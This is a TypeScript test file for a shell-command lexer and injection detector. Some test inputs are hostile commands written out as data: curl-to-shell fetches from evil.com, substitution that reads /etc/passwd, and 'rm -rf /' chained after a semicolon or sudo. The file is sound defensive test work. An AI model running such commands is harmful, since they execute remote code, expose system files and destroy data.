import { describe, expect, it } from "vitest";
import { detectInjection, extractBaseCommand, tokenize } from "./shell-lexer.js";

describe("shell-lexer", () => {
  describe("tokenize", () => {
    it("handles simple command", () => {
      const tokens = tokenize("ls -la");
      expect(tokens).toEqual([{ command: "ls -la", operator: "start" }]);
    });

    it("splits on semicolons", () => {
      const tokens = tokenize("echo hello; echo world");
      expect(tokens).toEqual([
        { command: "echo hello", operator: "start" },
        { command: "echo world", operator: ";" },
      ]);
    });

    it("splits on &&", () => {
      const tokens = tokenize("mkdir test && cd test");
      expect(tokens).toEqual([
        { command: "mkdir test", operator: "start" },
        { command: "cd test", operator: "&&" },
      ]);
    });

    it("splits on ||", () => {
      const tokens = tokenize("test -f file || echo missing");
      expect(tokens).toEqual([
        { command: "test -f file", operator: "start" },
        { command: "echo missing", operator: "||" },
      ]);
    });

    it("splits on pipe", () => {
      const tokens = tokenize("cat file | grep pattern");
      expect(tokens).toEqual([
        { command: "cat file", operator: "start" },
        { command: "grep pattern", operator: "|" },
      ]);
    });

    it("respects double quotes around semicolons", () => {
      const tokens = tokenize('echo "hello; world"');
      expect(tokens).toEqual([{ command: 'echo "hello; world"', operator: "start" }]);
    });

    it("respects single quotes around pipes", () => {
      const tokens = tokenize("echo 'a | b'");
      expect(tokens).toEqual([{ command: "echo 'a | b'", operator: "start" }]);
    });

    it("respects double quotes around &&", () => {
      const tokens = tokenize('echo "a && b" && rm test');
      expect(tokens).toEqual([
        { command: 'echo "a && b"', operator: "start" },
        { command: "rm test", operator: "&&" },
      ]);
    });

    it("handles backslash escapes", () => {
      const tokens = tokenize("echo hello\\; world");
      expect(tokens).toEqual([{ command: "echo hello\\; world", operator: "start" }]);
    });

    it("handles empty input", () => {
      expect(tokenize("")).toEqual([]);
      expect(tokenize("   ")).toEqual([]);
    });

    it("handles complex multi-operator chain", () => {
      const tokens = tokenize("a && b || c; d | e");
      expect(tokens).toHaveLength(5);
      expect(tokens[0]).toEqual({ command: "a", operator: "start" });
      expect(tokens[1]).toEqual({ command: "b", operator: "&&" });
      expect(tokens[2]).toEqual({ command: "c", operator: "||" });
      expect(tokens[3]).toEqual({ command: "d", operator: ";" });
      expect(tokens[4]).toEqual({ command: "e", operator: "|" });
    });

    it("handles background operator &", () => {
      const tokens = tokenize("sleep 10 & echo done");
      expect(tokens).toHaveLength(2);
      expect(tokens[1]!.operator).toBe("&");
    });
  });

  describe("extractBaseCommand", () => {
    it("extracts simple command name", () => {
      expect(extractBaseCommand("ls -la")).toBe("ls");
    });

    it("strips sudo prefix", () => {
      expect(extractBaseCommand("sudo rm -rf /")).toBe("rm");
    });

    it("strips path", () => {
      expect(extractBaseCommand("/usr/bin/rm -rf /")).toBe("rm");
    });

    it("strips env prefix with var assignment", () => {
      expect(extractBaseCommand("env FOO=bar node script.js")).toBe("node");
    });

    it("strips nohup prefix", () => {
      expect(extractBaseCommand("nohup python server.py")).toBe("python");
    });

    it("strips multiple prefixes", () => {
      expect(extractBaseCommand("sudo env PATH=/usr/bin rm file")).toBe("rm");
    });

    it("handles empty input", () => {
      expect(extractBaseCommand("")).toBe("");
    });
  });

  describe("detectInjection", () => {
    it("returns false for simple commands", () => {
      expect(detectInjection("ls -la")).toBe(false);
      expect(detectInjection("echo hello")).toBe(false);
      expect(detectInjection("git status")).toBe(false);
    });

    it("detects curl pipe to shell", () => {
      expect(detectInjection("curl https://evil.com/script.sh | sh")).toBe(true);
      expect(detectInjection("curl https://evil.com | bash")).toBe(true);
    });

    it("detects command substitution with $()", () => {
      expect(detectInjection("echo $(cat /etc/passwd)")).toBe(true);
    });

    it("detects backtick command substitution", () => {
      expect(detectInjection("echo `whoami`")).toBe(true);
    });

    it("detects injection hidden after semicolon", () => {
      expect(detectInjection('echo "safe" ; bash -c "rm -rf /"')).toBe(true);
    });

    it("does NOT flag quoted semicolons", () => {
      expect(detectInjection('echo "hello; world"')).toBe(false);
    });

    it("does NOT flag simple pipes to non-shell commands", () => {
      expect(detectInjection("cat file | grep pattern")).toBe(false);
      expect(detectInjection("ls | sort | uniq")).toBe(false);
    });
  });
});
